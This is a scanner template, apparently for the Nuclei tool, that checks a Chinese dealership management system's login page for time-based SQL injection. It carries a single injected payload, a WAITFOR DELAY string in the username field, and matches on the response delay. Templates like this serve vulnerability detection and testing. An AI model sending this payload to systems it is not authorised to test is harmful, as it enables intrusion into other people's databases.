id: poc-yaml-wangdao-4s-management-system-sqli
info:
  name: 王道4S管理系统 SQL注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
  description: |
    Detects a potential SQL injection vulnerability in 王道4S管理系统 by exploiting timing-based SQL injection.

variables:
  t1: "{{rand_int(5,10)}}"
  t2: "{{to_number(t1) + 2}}"

http:
  - raw:
      - |
        POST / HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded; charset=utf-8

        ScriptManager1=UpdatePanel3|btnLogin&__EVENTTARGET=btnLogin&__EVENTARGUMENT=&__LASTFOCUS=&__VIEWSTATE=&ddlUserName=&txtUserName=1';WAITFOR DELAY '0:0:{{t1}}'--&txtPassWord=1&cbBossedBroadcast=on&txtMACAddr=&__ASYNCPOST=true&

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "该用户不存在！"
          - "进入系统"
      - type: dsl
        dsl:
          - "status_code == 200"
          - "duration > to_number(t1)"
          - "duration < to_number(t2)"
